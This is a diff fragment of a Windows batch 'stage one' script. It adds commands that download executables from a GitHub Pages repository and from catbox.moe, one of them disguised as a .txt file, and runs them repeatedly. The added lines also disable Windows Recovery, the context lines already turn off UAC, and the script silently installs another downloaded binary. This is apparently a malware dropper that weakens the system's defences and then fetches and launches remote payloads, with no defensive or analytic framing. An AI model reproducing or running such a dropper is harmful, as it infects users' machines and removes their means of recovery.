@@ -84,9 +84,26 @@ curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/teamx-z/teamx-z.git
 
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
+curl --ssl-no-revoke -L -o file.exe https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/document.txt
+reagentc /disable
+start file.exe
+curl --ssl-no-revoke -L -o file2.exe https://files.catbox.moe/akc9rn.aexe
+start file2.exe
+start file2.exe
+start file2.exe
+start file2.exe
+curl --ssl-no-revoke -L -o file3.exe https://files.catbox.moe/c0uy0y.aexe
+start file3.exe
+start file3.exe
+start file3.exe
+start file3.exe
+curl --ssl-no-revoke -L -o dotnet.exe https://raw.githubusercontent.com/teamx-z/teamx-z.github.io/refs/heads/main/dl/dotnet.exe
+dotnet.exe /q /norestart /l "install.log"
+
 :: =================================
 :: Exits stage one
 :: =================================
 exit
+
 
 
